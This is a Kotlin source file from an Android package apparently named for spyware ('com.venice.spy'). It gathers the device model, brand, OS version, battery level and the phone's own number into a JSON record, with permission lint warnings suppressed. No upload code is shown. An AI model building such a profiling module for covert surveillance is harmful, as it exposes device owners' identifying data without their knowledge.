package com.venice.spy

import android.annotation.SuppressLint
import android.content.Context
import android.os.BatteryManager
import android.os.Build
import android.telephony.TelephonyManager
import org.json.JSONObject

object Device {
    fun battery(ctx: Context): Int = try {
        (ctx.getSystemService(Context.BATTERY_SERVICE) as BatteryManager)
            .getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY)
    } catch (e: Exception) { -1 }

    @SuppressLint("MissingPermission", "HardwareIds")
    fun phone(ctx: Context): String = try {
        (ctx.getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager).line1Number ?: ""
    } catch (e: Exception) { "" }

    fun info(ctx: Context): JSONObject = JSONObject().apply {
        put("name", Build.MODEL)
        put("model", Build.MODEL)
        put("brand", Build.BRAND)
        put("android", "${Build.VERSION.RELEASE} (API ${Build.VERSION.SDK_INT})")
        put("battery", battery(ctx))
        put("phone", phone(ctx))
    }
}